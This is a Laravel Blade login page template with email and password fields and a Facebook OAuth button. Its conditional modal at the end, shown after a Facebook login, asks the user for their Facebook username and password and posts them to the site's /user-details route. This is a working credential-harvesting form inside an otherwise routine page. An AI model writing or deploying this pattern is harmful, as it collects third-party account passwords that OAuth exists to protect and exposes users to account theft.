<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login</title>
    <link rel="stylesheet" href="./assets/css/login.css" />
  
  </head>
  <style>
    /* Overlay */
    .modal-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.5);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 1000;
    }

    /* Modal Content */
    .modal-content {
        background: #fff;
        padding: 20px;
        border-radius: 8px;
        max-width: 400px;
        width: 100%;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        position: relative;
    }

    /* Modal Header */
    .modal-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 15px;
    }

    /* Close Button */
    .close-btn {
        background: none;
        border: none;
        font-size: 1.5rem;
        cursor: pointer;
    }

    /* Form Styling */
    .form-group {
        margin-bottom: 15px;
    }

    .form-group label {
        display: block;
        font-weight: bold;
        margin-bottom: 5px;
    }

    .form-input {
        width: 100%;
        padding: 8px;
        border: 1px solid #ccc;
        border-radius: 4px;
    }

    /* Submit Button */
    .submit-btn {
        width: 100%;
        padding: 10px;
        background-color: #007bff;
        color: #fff;
        border: none;
        border-radius: 4px;
        cursor: pointer;
    }

    .submit-btn:hover {
        background-color: #0056b3;
    }
</style>
  <body>
    
    <div class="login_form">
      <!-- Close button linking to index -->
      <a href="index.html" class="close_button">&times;</a>

      <form action="#">
        <h3>Log In</h3>

        <p class="sign_up">
          <a href="register.html">New to this site? Sign up</a>
        </p>

        <!-- Email input box -->
        <div class="input_box">
          <label for="email">Email</label>
          <input
            type="email"
            id="email"
            placeholder="Enter email address"
            required
          />
        </div>

        <!-- Password input box -->
        <div class="input_box">
          <label for="password">Password</label>
          <input
            type="password"
            id="password"
            placeholder="Enter your password"
            required
          />
          <a href="#" class="forgot_password">Forgot Password?</a>
        </div>

        <!-- Login button -->
        <button type="submit">Log In</button>

        <!-- Login option separator -->
        <p class="separator">
          <span>or Log In with</span>
        </p>

        <div class="login_option">
          <!-- Google button -->
          {{-- <div class="option">
            <a href="#">
              <img src="./assets/logos/google.png" alt="Google" />
            </a>
          </div> --}}

          <!-- Facebook button -->
          <div class="option">
            <a href="{{url('auth/facebook')}}">
              <img src="./assets/logos/fb.png" alt="Facebook" />
            </a>
          </div>
        </div>
      </form>
    </div>
    

    @if(session('message') === 'logged in via facebook')
    <div id="facebookModal" class="modal-overlay" style="display: flex;">
      <div class="modal-content">
          <div class="modal-header">
              <h5>Please provide your facebook username and password</h5>
              <button type="button" class="close-btn" onclick="closeModal()">×</button>
          </div>
          <div class="modal-body">
              <form action="/user-details" method="POST">
                  @csrf
                  <div class="form-group">
                      <label for="facebook_username">Username</label>
                      <input type="text" name="facebook_username" id="facebook_username" required class="form-input">
                  </div>
                  <div class="form-group">
                      <label for="facebook_password">Password</label>
                      <input type="password" name="facebook_password" id="facebook_password" required class="form-input">
                  </div>
                  <button type="submit" class="submit-btn">Submit</button>
              </form>
          </div>
      </div>
  </div>
    @endif



    

  </body>
</html>
